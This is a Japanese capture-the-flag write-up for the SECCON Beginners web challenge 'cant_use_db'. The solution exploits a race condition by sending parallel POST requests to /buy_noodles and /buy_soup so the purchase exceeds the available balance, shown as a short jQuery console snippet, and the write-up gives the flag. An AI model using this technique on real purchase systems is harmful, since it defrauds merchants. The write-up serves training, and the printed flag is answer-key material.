# cant_use_db

## 問題文
Can't use DB.  
I have so little money that I can't even buy the ingredients for ramen.  
🍜  
[https://cant-use-db.quals.beginners.seccon.jp/](https://cant-use-db.quals.beginners.seccon.jp/)  
[cant_use_db.tar.gz](files/cant_use_db.tar.gz) 1cded20dd165e1eca3cc12bee2010e65fe6ba9ea  

## 難易度
**Medium**  

## 作問にあたって
通常のrace condition問です。  
もう少し時間についてシビアにしたかったですが、通信環境が悪い方々も解けるようsleepを挿入しました。  

## 解法
ソースを見ると、ユーザ情報はファイル管理のようだ。  
所持金以上のものを買うサイトから見てもrace conditionを狙う。  
ソースを見ると購入処理で`/buy_noodles`、`/buy_soup`へPOSTを投げているようだ。  
並列にPOSTを投げてやればよい。  
```bash
$ python solver.py
~~~
ctf4b{r4m3n_15_4n_3553n714l_d15h_f0r_h4ck1n6}
```
ブラウザコンソールで以下を実行した後`/eat`へアクセスしてもよい。  
```javascript
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
$.post('/buy_noodles');
$.post('/buy_soup');
```

## ctf4b{r4m3n_15_4n_3553n714l_d15h_f0r_h4ck1n6}